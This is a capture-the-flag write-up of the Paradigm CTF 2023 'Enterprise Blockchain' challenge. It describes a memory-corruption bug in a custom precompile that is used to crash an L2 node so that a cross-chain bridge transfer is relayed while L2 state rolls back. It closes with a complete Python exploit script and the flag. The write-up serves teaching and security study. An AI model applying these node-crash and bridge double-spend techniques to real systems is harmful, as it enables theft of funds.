---
title: Blockchain - Enterprise Blockchain
description: 2023 | Paradigm CTF | PWN
tags:
    - smart contract
    - cross chain
    - revm
    - precompiled contract
    - state override set
    - infrastructure
---

## Description

Smart Contract Solutions is proud to introduce the only Enterprise Blockchain that you'll ever need.

> [Challenge Files](https://github.com/paradigmxyz/paradigm-ctf-2023/blob/2dab351eb27b57f32bab5aaaf3338638aaf9e4f8/enterprise-blockchain/challenge.yaml)

## Solution

- There are two chains and the challenge is deployed on the layer 1 chain. Initially, there are 100 FlagTokens (18 decimals) in the l1Bridge. The objective of this challenge is to pull at least 10 FlagTokens from the l1Bridge

    ```js
    vm.createSelectFork(vm.envString("L1_RPC"));
    vm.startBroadcast(system);
    Bridge l1Bridge = new Bridge(relayer);
    FlagToken flagToken = new FlagToken(address(l1Bridge), player);

    challenge = address(new Challenge(address(l1Bridge), address(flagToken)));
    vm.stopBroadcast();
    ```

- Users can transfer funds between chains via the bridge. The relayer will listen to the `SendRemoteMessage` event in both chains and relay messages to the target chain

    ```py
    if log.event == "SendRemoteMessage":
        try:
            if _dst_chain_id == log.args["targetChainId"]:
                tx_hash = dst_bridge.functions.relayMessage(
                    log.args["targetAddress"],
                    _src_chain_id,
                    log.args["sourceAddress"],
                    log.args["msgValue"],
                    log.args["msgNonce"],
                    log.args["msgData"],
                ).transact()
    ```

    ```js
    function relayMessage(
        address _targetAddress,
        uint256 _sourceChainId,
        address _sourceAddress,
        uint256 _value,
        uint256 _nonce,
        bytes calldata _message
    ) external onlyRelayer {
        ...
        (bool success, bytes memory result) = _targetAddress.call{value: _value}(_message);
        require(success, string(result));
        ...
    }
    ```

- To emit a SendRemoteMessage event, we can call `sendRemoteMessage()` function and the transaction to be executed on the other chain can be customized

    ```js
    function sendRemoteMessage(uint256 _targetChainId, address _targetAddress, bytes calldata _message)
        public
        payable
    {
        require(_targetChainId != block.chainid, "C");
        require(_targetAddress != address(0), "A");
        emit SendRemoteMessage(_targetChainId, _targetAddress, msg.sender, msg.value, msgNonce, _message);
        unchecked {
            ++msgNonce;
        }
    }
    ```

- Since L2 RPC is also provided and the player has some ethers, we can send a remote message from L2 to L1 and transfer tokens from l1Bridge to users

    ```js
    l2Bridge.sendRemoteMessage(
        78704,
        address(flagToken),
        abi.encodeWithSignature(
            "transfer(address,uint256)",
            player,
            50 ether
        )
    )
    ```

- However, [the `sendRemoteMessage()` function is not intended to be public](https://twitter.com/junorouse/status/1719024561885499840) and it is expected to only use `ethOut()` / `ERC20Out()` to transfer funds between chains :< The above is an unintended solution lol
- A `SimpleMultiSigGov` is deployed at 0x31337 on the L2 chain. It can be used to interact with the precompiled contract `ADMIN` at 1337

    ```py
    # deploy multisig
    anvil_setCodeFromFile(
        l2_web3,
        "0x0000000000000000000000000000000000031337",
        "MultiSig.sol:SimpleMultiSigGov",
    )
    ```

- The precompiled contract `ADMIN` has a function `fn_dump_state()`, operations in which may cause undefined behavior. First, `x.len()` should be greater than `0x10`, otherwise the program will panic with `index out of bounds` when `i == x.len()`. `states` is a raw pointer to slices `&[u8]` and a slice is 16 bytes on an x86-64. The count of `states.offset` is in units of a slice. Since the maximum of `i` is `0x10`, the minimum memory that should be allocated is 0x110 (16 * (0x10 + 1)) instead of `0x100`. Thus, if `x.len()` is greater than `0x10`, the program will write to unallocated memory `states.offset(0x10)`

    ```rs
    fn fn_dump_state(x: &[u8]) -> u64 {
        unsafe {
            let states: *mut &[u8] = libc::malloc(0x100) as *mut &[u8];
            let mut i = 0;
            while i <= x.len() && i <= 0x10 {
                states.offset(i as isize).write_bytes(x[i], 1 as usize);
                i += 1;
            }

            let mut file = fs::OpenOptions::new()
            .create(true)
            .write(true)
            .open("/tmp/dump-state").unwrap();

            let _ = file.write_all(&*states);
            libc::free(states as *mut libc::c_void);
        }
        return 0u64;
    }
    ```

- Calling `fn_dump_state()` when `x.len() > 0x10` will kill the L2 node. The `anvil` service will soon [restart](https://github.com/paradigmxyz/paradigm-ctf-infrastructure/blob/6c39333a674f18458bc27256091ab0306b9d432e/paradigmctf.py/ctf_server/backends/docker_backend.py#L54) and [load the state](https://github.com/paradigmxyz/paradigm-ctf-infrastructure/blob/6c39333a674f18458bc27256091ab0306b9d432e/paradigmctf.py/ctf_server/types/__init__.py#L41-L42) from the previously dumped state
- The state dump interval is 5 seconds, but the relayer will relay the message as long as it catches the `SendRemoteMessage` event. If the L2 node goes down when new cross-chain transfer transactions have been included in a block but the latest state has not yet been dumped, the message will be relayed to L1 while the state of L2 can only be restored to the state before the transfer occurred. In this case, users can transfer funds to L1 without spending any in L2 :O

    ```py
    def format_anvil_args(args: LaunchAnvilInstanceArgs, anvil_id: str, port: int = 8545) -> List[str]:
        ...
        cmd_args += ["--state", f"/data/{anvil_id}-state.json"]
        cmd_args += ["--state-interval", "5"]
    ```

- Only the `SimpleMultiSigGov` at 0x31337 can interact with the `ADMIN`, but we can't obtain any valid signatures to let it execute transactions. Alternatively, we can leverage the state override set to ephemerally override the code at 0x31337 and simulate the call
- The `admin_func_run()` function is the entry point of `ADMIN`. To invoke the `fn_dump_state()` function, the first two bytes should be `0x0204`

    ```rs
    pub const ADMIN: PrecompileAddress = PrecompileAddress(
        crate::u64_to_address(1337),
        Precompile::Context(admin_func_run),
    );

    fn fn_reload_runtime_config(rest: &[u8], _context: &CallContext) -> u64 {
        if rest.len() == 0 {
            return 1u64
        } else {
            return match ConfigKind::from_u8(rest[0]) {
                ...
                ConfigKind::DumpState => fn_dump_state(&rest[1..]),
                _ => 1u64
            };
        }
    }

    fn admin_func_run(i: &[u8], target_gas: u64, context: &CallContext) -> PrecompileResult {
        ...

        if gas_base != target_gas {
            return Err(Error::OutOfGas);
        }

        if i.len() == 0 || !is_multisig(&context) {
            return Err(Error::EnterpriseHalt);
        }

        let out = match AdminCallKind::from_u8(i[0]) {
            AdminCallKind::EmergencyStop => fn_emergency_stop(&i[1..], context),
            AdminCallKind::ReloadRuntimeConfig => fn_reload_runtime_config(&i[1..], context),
            AdminCallKind::Mint => fn_mint(&i[1..], context),
            AdminCallKind::Burn => fn_burn(&i[1..], context),
            AdminCallKind::Unknown => u64::MAX
        };

        ...
    }

    pub enum ConfigKind {
        ...
        DumpState = 4,
        Unknown,
    }

    pub enum AdminCallKind {
        EmergencyStop = 1,
        ReloadRuntimeConfig = 2,
        Mint = 3,
        Burn = 4,
        Unknown,
    }
    ```

### Exploitation

```py
import pwn
from time import sleep
from cheb3 import Connection
from cheb3.utils import compile_sol, encode_with_signature, decode_data

bridge_abi, _ = compile_sol(
    """
interface IBridge {
    function remoteTokenToLocalToken(address) external view returns (address);
    function ERC20Out(address token, address to, uint256 amount) external;                       
}
""",
    solc_version="0.8.20",
)["IBridge"]
flag_token_abi, _ = compile_sol(
    """
interface IFlagToken {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
""",
    solc_version="0.8.20",
)["IFlagToken"]

HOST = "localhost"
PORT = 1337
svr = pwn.remote(HOST, PORT)
svr.sendlineafter(b"action?", b"1")

svr.recvuntil(b"rpc endpoints:")
l1 = Connection(svr.recvline_contains(b"l1").replace(b"-", b"").strip().decode())
l2 = Connection(svr.recvline_contains(b"l2").replace(b"-", b"").strip().decode())

priv = svr.recvline_contains(b"private").split(b":")[-1].strip().decode()
setup = svr.recvline_contains(b"challenge").split(b":")[-1].strip().decode()
svr.close()

l1account = l1.account(priv)
l2account = l2.account(priv)

bridge = decode_data(
    l1account.call(setup, data=encode_with_signature("BRIDGE()")), ["address"]
)
l1bridge = l1.contract(l1account, address=bridge, abi=bridge_abi)
l2bridge = l2.contract(l2account, address=bridge, abi=bridge_abi)

flag_token_addr = decode_data(
    l1account.call(setup, data=encode_with_signature("FLAG_TOKEN()")), ["address"]
)
flag_token = l1.contract(l1account, address=flag_token_addr, abi=flag_token_abi)

# Transfer FlagTokens from L1 to L2
flag_token.functions.approve(bridge, int(1e18)).send_transaction()
l1bridge.functions.ERC20Out(
    flag_token_addr, l2account.address, int(1e18)
).send_transaction()

# Waiting for message to be relayed
sleep(2)

l2token = l2bridge.caller.remoteTokenToLocalToken(flag_token_addr)

# Waiting for the latest state to be dumped
sleep(5)

# Transfer FlagTokens from L2 to L1
for i in range(100):
    balance = flag_token.caller.balanceOf(bridge)
    print(f"FlagToken balance of l1Bridge: {balance}")
    if balance < int(90e18):
        break

    l2balance = decode_data(
        l2account.call(
            l2token,
            data=encode_with_signature("balanceOf(address)", l2account.address),
        ),
        ["uint256"],
    )
    print(f"FlagToken L2 balance of player: {l2balance}")

    l2bridge.functions.ERC20Out(
        l2token, l1account.address, int(5e17) - i  # avoid same relay message hash
    ).send_transaction()

    # Waiting for message to be relayed
    sleep(2)

    while True:
        try:
            # Kill the L2 node
            l2account.call(
                "0x0000000000000000000000000000000000031337",
                state_override={
                    "0x0000000000000000000000000000000000031337": {
                        # address(1337).staticcall{gas: 2000}(abi.encodePacked(hex"0204", new bytes(0x11)))
                        "code": "0x6002600053600460015360006000601360006105396107d0fa"
                    },
                },
            )
            continue
        except:
            # Waiting for L2 node to restart
            sleep(5)
            break

svr = pwn.remote(HOST, PORT)
svr.sendlineafter(b"action?", b"3")
svr.interactive()
```

### Flag

> PCTF{57473_0V3RR1d35_90_8RR}

## References

- [rust - Unexpected segfault when working with raw pointers - Stack Overflow](https://stackoverflow.com/a/72642894/13542937)
- [Arrays and Slices - Rust By Example](https://rustwiki.org/en/rust-by-example/primitives/array.html)
- [pointer - Rust](https://doc.rust-lang.org/std/primitive.pointer.html#method.offset)
- [eth_call - Ethereum](https://docs.alchemy.com/reference/eth-call)
